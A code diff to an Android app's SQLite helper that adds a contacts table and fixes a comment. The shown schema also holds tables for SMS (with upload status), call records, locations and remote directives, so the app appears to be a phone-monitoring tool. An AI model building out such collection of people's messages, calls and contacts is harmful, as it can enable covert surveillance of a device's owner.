@@ -1,6 +1,7 @@
 package com.privacy.monitor.db;
 
 import com.privacy.monitor.domain.CallRecord;
+import com.privacy.monitor.domain.Contacts;
 import com.privacy.monitor.domain.Directive;
 import com.privacy.monitor.domain.LocationMessage;
 import com.privacy.monitor.domain.Monitor;
@@ -23,6 +24,11 @@ public class MySQLiteOpenHelper extends SQLiteOpenHelper {
 	@Override
 	public void onCreate(SQLiteDatabase db) {
 		
+		//通信录表
+		db.execSQL("CREATE TABLE IF NOT EXISTS " + ContactsDB.TABLE_NAME + " ( "+
+		Contacts.COL_ID+" INTEGER PRIMARY KEY AUTOINCREMENT , " +
+		Contacts.COL_NAME+" varchar(10) ," + Contacts.COL_PHONE +" varchar(30) );");
+		
 		//指令表
 		db.execSQL("CREATE TABLE IF NOT EXISTS "+DirectiveDB.TABLE_NAME+" (" +
 		Directive.COL_DID + " INTEGER PRIMARY KEY AUTOINCREMENT," +
@@ -44,7 +50,7 @@ public class MySQLiteOpenHelper extends SQLiteOpenHelper {
 		SMSRecord.COL_SMS_TYPE +" varchar(5) ," +SMSRecord.COL_SENT_STATUS +" varchar(5),"+
 		SMSRecord.COL_UPLOAD_STATUS +" varchar(5) ) ;");
 		
-		//通信录表
+		//通话记录
 		db.execSQL("CREATE TABLE IF NOT EXISTS " + CallRecordDB.TABLE_NAME +" (" +
 		CallRecord.COL_ID +" INTEGER PRIMARY KEY AUTOINCREMENT ," +CallRecord.COL_MY_PHONE +" TEXT," +
 		CallRecord.COL_PHONE + " TEXT," + CallRecord.COL_CALL_STATUS +" varchar(5) ,"+
